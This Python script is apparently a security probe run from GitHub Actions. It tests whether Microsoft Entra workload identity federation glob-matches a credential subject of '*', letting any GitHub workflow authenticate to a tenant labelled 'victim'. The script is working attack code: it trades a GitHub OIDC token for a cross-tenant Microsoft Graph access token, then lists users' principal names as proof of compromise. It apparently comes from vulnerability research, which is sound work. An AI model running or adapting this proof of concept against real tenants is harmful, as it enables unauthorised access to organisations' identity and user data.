# F39 S162 — GitHub OIDC WIF Exchange — WILDCARD GLOB HYPOTHESIS TEST
# Session: S162-103022
# FIC.subject has been set to '*' (literal asterisk) by the 162 orchestrator script.
# GitHub Actions will generate OIDC token with sub=repo:SniperShot007/Test:ref:refs/heads/master
# These DO NOT match literally: '*' != 'repo:SniperShot007/Test:ref:refs/heads/master'
# IF WIF exchange returns HTTP 200: Entra uses GLOB matching — critical finding
# IF WIF exchange returns HTTP 4xx: Entra uses LITERAL matching only
#
# T1 (victim): 3f5c2342-5a70-49d9-a1b6-971a500d3fd0
# T2 client:   74f5d984-cb89-458e-ac75-ad84eaa44425

import os, sys, json, base64
import urllib.request, urllib.parse, urllib.error

T1_TENANT    = "3f5c2342-5a70-49d9-a1b6-971a500d3fd0"
T2_CLIENT_ID = "74f5d984-cb89-458e-ac75-ad84eaa44425"
GH_AUDIENCE  = "api://AzureADTokenExchange"

print("=== F39 S162: GitHub OIDC -> T1 WIF Exchange — WILDCARD GLOB TEST ===")
print(f"T1_TENANT={T1_TENANT}")
print(f"T2_CLIENT_ID={T2_CLIENT_ID}")
print("")
print("HYPOTHESIS:")
print("  FIC.subject = '*' (literal asterisk, set by S162 orchestrator before this run)")
print("  OIDC.sub    = (actual GitHub Actions subject — NOT '*')")
print("  If HTTP 200: Entra GLOB-matches '*' against any sub value")
print("  If HTTP 4xx: Entra LITERAL-matches only — '*' != GitHub sub")

# Step 1: Get GitHub OIDC token (audience = api://AzureADTokenExchange)
req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=" + GH_AUDIENCE
req_tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]

try:
    r = urllib.request.urlopen(
        urllib.request.Request(req_url, headers={"Authorization": f"bearer {req_tok}"}),
        timeout=30,
    )
    oidc_tok = json.loads(r.read())["value"]
except Exception as e:
    print(f"*** ERROR: Failed to get GitHub OIDC token: {e}")
    sys.exit(1)

# Decode OIDC JWT payload for logging
parts = oidc_tok.split(".")
pad   = "=" * (-len(parts[1]) % 4)
oidc_pay = json.loads(base64.b64decode(parts[1] + pad))
oidc_sub = oidc_pay.get("sub", "?")
oidc_iss = oidc_pay.get("iss", "?")

print("")
print("=== OIDC TOKEN OBTAINED ===")
print(f"OIDC.iss={oidc_iss}")
print(f"OIDC.sub={oidc_sub}")
print(f"OIDC.aud={oidc_pay.get('aud')}")
print(f"OIDC token length: {len(oidc_tok)}")
print("")
print("=== WILDCARD GLOB TEST ===")
print(f"FIC.subject = '*'  (set before this run)")
print(f"OIDC.sub    = '{oidc_sub}'")
print(f"Literal match: '{oidc_sub}' == '*'  →  {oidc_sub == '*'}")
print("Attempting WIF exchange now...")

# Step 2: WIF exchange — grant_type=client_credentials + OIDC token as assertion
data = urllib.parse.urlencode({
    "grant_type":            "client_credentials",
    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion":      oidc_tok,
    "client_id":             T2_CLIENT_ID,
    "scope":                 "https://graph.microsoft.com/.default",
}).encode()

req2 = urllib.request.Request(
    f"https://login.microsoftonline.com/{T1_TENANT}/oauth2/v2.0/token",
    data=data, method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)

try:
    resp2 = urllib.request.urlopen(req2, timeout=30)
    result = json.loads(resp2.read())
    access_token = result["access_token"]

    # Decode result JWT
    parts2 = access_token.split(".")
    pad2   = "=" * (-len(parts2[1]) % 4)
    pay2   = json.loads(base64.b64decode(parts2[1] + pad2))
    appid  = pay2.get("appid", "?")
    tid    = pay2.get("tid", "?")
    roles  = pay2.get("roles", [])

    print("")
    print("*** CRIT S162: WIF EXCHANGE HTTP 200")
    print(f"*** GLOB_MATCH_CONFIRMED: FIC.subject='*' accepted OIDC.sub='{oidc_sub}'")
    print("*** Entra WIF subject matching uses GLOB not LITERAL")
    print("*** ANY GitHub Actions workflow from ANY repository authenticates against FIC sub='*'")
    print(f"JWT.appid={appid}  tid={tid}  roles_count={len(roles)}")

    if appid != T2_CLIENT_ID:
        print(f"SCOPE_CHANGED=TRUE  (appid={appid} is T1 native app, NOT T2 {T2_CLIENT_ID})")
    print(f"S:C_PROOF: JWT carries T1 identity (appid/tid both T1)")

    # Step 3: C:H proof — GET /users
    req3 = urllib.request.Request(
        "https://graph.microsoft.com/v1.0/users?$select=userPrincipalName",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    resp3 = urllib.request.urlopen(req3, timeout=30)
    users = json.loads(resp3.read()).get("value", [])
    print(f"C:H_CONFIRMED: GET /users HTTP 200 count={len(users)}")
    for u in users[:10]:
        print(f"  UPN: {u.get('userPrincipalName')}")
    if len(users) > 10:
        print(f"  ... ({len(users)-10} more)")

except urllib.error.HTTPError as e:
    body = e.read().decode(errors="replace")
    print("")
    print(f"*** S162: WIF EXCHANGE HTTP {e.code}")
    print(f"*** LITERAL_ONLY: FIC.subject='*' does NOT match OIDC.sub='{oidc_sub}'")
    print(f"*** Entra uses LITERAL subject matching — '*' is NOT a glob wildcard")
    print(f"*** PATH 4 independent wildcard proof: NOT CONFIRMED")
    print(f"Error body: {body[:800]}")
    # Not a script error — just hypothesis outcome
    sys.exit(0)
except Exception as ex:
    print(f"*** EXCEPTION: {ex}")
    sys.exit(1)
